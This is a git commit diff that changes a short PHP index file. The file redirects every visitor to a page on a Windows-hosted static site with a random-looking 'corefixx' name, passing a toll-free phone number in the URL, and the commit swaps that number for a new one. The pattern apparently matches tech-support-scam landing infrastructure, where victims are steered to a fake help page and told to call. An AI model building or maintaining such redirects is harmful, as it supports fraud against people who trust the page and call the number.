e7500a49dcc2699a109fc39f96e2a8d1558b3521
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-10-30 22:18:13 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <?php
 // Define the destination URL
-$destination_url = "https://foxcon87gcorefixx98.z20.web.core.windows.net/index.html?Aniph=1-855-458-7201";
+$destination_url = "https://foxcon87gcorefixx98.z20.web.core.windows.net/index.html?Aniph=1-803-201-2766";
 
 // Send the Location header for redirection
 header("Location: " . $destination_url);
